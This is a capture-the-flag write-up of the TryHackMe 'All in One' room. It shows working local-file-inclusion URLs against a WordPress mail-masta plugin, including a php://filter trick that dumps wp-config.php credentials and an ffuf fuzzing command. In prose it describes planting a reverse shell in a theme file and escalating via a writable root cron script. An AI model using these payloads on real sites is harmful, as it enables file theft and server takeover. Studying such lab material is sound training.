#LFI #lxd #lxc #alpine

https://tryhackme.com/r/room/allinonemj

---
#### Nmap
![[Screenshot_2024-05-28_16-40-09.png]]

Absolutely nothing on the FTP as anonymous, let's go enumerate

**On `/`**
![[Screenshot_2024-05-28_16-53-04.png]]

On the `/hackthons` page, there are one sentence and some comments:
```text
<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>

<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

And there is a `/wordpress` , `5.5.1 version` this time

`wpscan` gave me this [CVE-2016-10956](https://www.exploit-db.com/exploits/40290) to do some **L**ocal **F**ile **I**ntrusion
```text
http://10.10.112.117/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

It gave the the user `elyana`

[Here](https://www.infosecinstitute.com/resources/hacking/local-file-inclusion-code-execution/) is a good article about LFI techniques

I tried this LFI payload but nothing happened: `?pl=/proc/self/environ&cmd=cat /etc/passwd` 

I try to enumerate with in LFI, I've found a lot of useless shit:
```shell
ffuf -u 'http://10.10.112.117/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=FUZZ' -w file_inclusion_linux.txt -fc 500
```

![[Screenshot_2024-05-28_18-18-09.png]]

I found the basic wordpress data structure [here](https://github.com/cyberteach360/Hacking-Wordpress) and I used the php filter to base 64 encode `wp-config.php`'s content:
```text
http://10.10.139.210/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```

Once decoded, it gave me this:
```text
/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );
```

With these creds, I am able to connect on `elyana`'s account.

So I changed the `404.php` page of the current theme (twentytwenty) and I placed a reverse shell in it. Then I triggered it by going to this url:
```text
http://10.10.139.210/wordpress/wp-content/themes/twentytwenty/404.php
```

And here I m in

There was a crontab executing `/var/backups/script.sh` as root with `0777` permissions on it, so I just created a second reverse shell to get root

And here I m root

Another way of escalate is the `lxd/lxc Group` with alpine shit [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
